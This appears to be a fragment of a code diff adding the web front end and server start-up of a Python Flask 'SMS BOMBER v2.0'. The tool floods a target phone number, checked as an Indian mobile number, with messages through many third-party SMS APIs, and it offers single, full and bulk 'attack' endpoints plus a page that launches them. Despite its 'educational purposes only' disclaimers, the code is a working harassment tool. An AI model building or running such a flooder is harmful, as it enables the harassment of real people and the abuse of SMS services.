+                <p>Advanced SMS flooding system - Use with extreme caution</p>
+                <div class="api-count">
+                    <span><strong>""" + str(len(APIS)) + """</strong> ACTIVE BOMBS</span>
+                </div>
+                <p class="warning">⚠️ WARNING: For educational purposes only. Misuse may result in legal consequences.</p>
+            </div>
+            
+            <div class="endpoints-grid">
+                <div class="endpoint-card">
+                    <h3><span class="method-badge method-get">GET</span> FULL ASSAULT</h3>
+                    <div class="endpoint-code">/api?num=9876543210</div>
+                    <p>Launch all """ + str(len(APIS)) + """ attack vectors simultaneously</p>
+                </div>
+                
+                <div class="endpoint-card">
+                    <h3><span class="method-badge method-get">GET</span> TARGETED STRIKE</h3>
+                    <div class="endpoint-code">/api/test?num=9876543210&api=Name</div>
+                    <p>Test individual attack vectors</p>
+                </div>
+                
+                <div class="endpoint-card">
+                    <h3><span class="method-badge method-post">POST</span> MASS ATTACK</h3>
+                    <div class="endpoint-code">/api/bulk</div>
+                    <p>Deploy attacks on multiple targets with custom configuration</p>
+                </div>
+            </div>
+            
+            <div class="test-section">
+                <h2>⚡ ENTER TARGET NUMBER</h2>
+                <div class="test-form">
+                    <input type="text" id="phoneNumber" class="test-input" placeholder="Enter 10-digit target number" maxlength="10">
+                    <button class="test-button" onclick="testAPI()">LAUNCH ATTACK</button>
+                </div>
+                <div class="response-box" id="responseBox">
+                    <p>Enter target number and click LAUNCH ATTACK to deploy all """ + str(len(APIS)) + """ bombs</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>SMS BOMBER v2.0 | WARNING: Use responsibly | ⚠️ STRICTLY FOR EDUCATIONAL PURPOSES</p>
+        </div>
+        
+        <script>
+            function testAPI() {
+                const phone = document.getElementById('phoneNumber').value.trim();
+                const responseBox = document.getElementById('responseBox');
+                const button = document.querySelector('.test-button');
+                
+                if (!phone || phone.length !== 10 || !phone.match(/^[6-9]\\d{9}$/)) {
+                    responseBox.innerHTML = '<p class="error">❌ INVALID TARGET: Enter valid 10-digit Indian number</p>';
+                    return;
+                }
+                
+                button.disabled = true;
+                button.textContent = 'DEPLOYING...';
+                responseBox.innerHTML = '<p class="loading"> ATTACK START ' + """ + str(len(APIS)) + """ + ' ATTACK VECTORS...</p>';
+                
+                fetch(`/api?num=${phone}&workers=8`)
+                    .then(response => response.json())
+                    .then(data => {
+                        let html = `<div class="success">✅ MISSION COMPLETE in ${data.total_time_seconds}s</div>`;
+                        html += `<p><strong>💣 TOTAL PAYLOADS:</strong> ${data.total_requests}</p>`;
+                        html += `<p><strong>✅ SUCCESSFUL HITS:</strong> ${data.successful}</p>`;
+                        html += `<p><strong>❌ FAILED LAUNCHES:</strong> ${data.failed}</p>`;
+                        html += `<p><strong>⏱️ MISSION TIME:</strong> ${data.total_time_seconds} seconds</p>`;
+                        html += `<p><strong>📅 TIMESTAMP:</strong> ${new Date(data.timestamp).toLocaleString()}</p>`;
+                        
+                        responseBox.innerHTML = html;
+                    })
+                    .catch(error => {
+                        responseBox.innerHTML = `<p class="error">❌ SYSTEM ERROR: ${error.message}</p>`;
+                    })
+                    .finally(() => {
+                        button.disabled = false;
+                        button.textContent = 'LAUNCH ATTACK';
+                    });
+            }
+            
+            // Auto-format phone input
+            document.getElementById('phoneNumber').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\\D/g, '');
+                if (value.length > 10) value = value.slice(0, 10);
+                e.target.value = value;
+            });
+        </script>
+    </body>
+    </html>
+    """
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    print(f"Loaded {len(APIS)} APIs")
+    print(f"Server starting on port {port}")
+    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
